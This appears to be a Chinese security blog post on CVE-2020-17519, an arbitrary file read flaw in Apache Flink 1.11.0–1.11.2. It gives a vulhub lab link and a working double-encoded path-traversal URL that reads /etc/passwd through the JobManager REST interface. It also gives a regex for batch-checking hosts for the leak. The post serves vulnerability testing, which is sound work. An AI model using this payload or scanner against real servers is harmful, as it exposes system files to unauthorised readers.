**声明  
本文仅用于技术交流，请勿用于非法用途  
由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。  
文章作者拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。**

Apache Flink 是高效和分布式的通用数据处理平台。

Apache Flink 声明式的数据分析开源系统，结合了分布式 MapReduce
类平台的高效，灵活的编程和扩展性,具有强大的流处理和批处理功能。同时在并行数据库发现查询优化方案。

    
    
    要求
    Unix 类环境(Linux, Mac OS X, Cygwin)
    
    git
    
    Maven (at least version 3.0.4)
    
    Java 6, 7 or 8 (Note that Oracle's JDK 6 library will fail to build Flink, but is able to run a pre-compiled package without problem)
    
    git clone https://github.com/apache/incubator-flink.git
    cd incubator-flink
    mvn clean package -DskipTests # this will take up to 5 minutes
    

Apache Flink
1.11.0中引入的一项更改(包括版本1.11.1和1.11.2)允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。

 **从官方文档来看 只能在UINX系统运行**

 **影响版本：**  
1.11.0  
1.11.1  
1.11.2

 **Docker地址：**

    
    
    https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519
    

**POC：**

    
    
    /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
    

![1609989413_5ff67d2520de918a5a397.png!small](https://image.3001.net/images/20210107/1609989413_5ff67d2520de918a5a397.png!small)

Python批量检测脚本:

提供下正则：

    
    
    pattern=re.compile(
                    r"((root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody"
                    r"|syslog|mysql"
                    r"|bind|ftp|sshd|postfix):[\d\w\-\s,]+:\d+:\d+:[\w\-_\s,]*:[\w\-_\s,\/]*:[\w\-_,"
                    r"\/]*[\r\n])")
    
    
                re_html=pattern.findall(html)
    

本地新建host.txt  
放入要检测的url回车分割  
逐行读取  
![1609989438_5ff67d3ede4f2c0e40e70.png!small](https://image.3001.net/images/20210107/1609989438_5ff67d3ede4f2c0e40e70.png!small)

脚本放在文末公众号了：  
回复“Flink”获取批量检测脚本

![1609989473_5ff67d610069fee86defc.png!small](https://image.3001.net/images/20210107/1609989473_5ff67d610069fee86defc.png!small)

